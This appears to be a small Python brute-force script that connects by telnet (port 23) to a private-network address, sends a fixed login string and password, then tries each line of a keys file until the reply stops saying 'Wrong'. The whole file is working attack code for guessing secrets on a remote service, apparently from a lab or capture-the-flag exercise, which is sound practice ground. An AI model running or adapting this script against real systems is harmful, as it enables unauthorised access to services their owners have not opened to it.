import socket
import time
host = '192.168.43.223'
port = 23


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

f = open('keys.txt')
print('[*] waiting for response')
print(s.recv(4096))
print('[*] sending an initial warmup string')
s.send('lmao\n')
print(s.recv(4096))
s.send('56nlj0&')
print(s.recv(4096))
time.sleep(1)
for l in f:
    print('[*] sending ' + l)
    s.send(l + '\n')
    data = s.recv(4096)
    if 'Wrong' not in data:
        break
    else:
        print(data)

print('[!] nope, nothing mate')
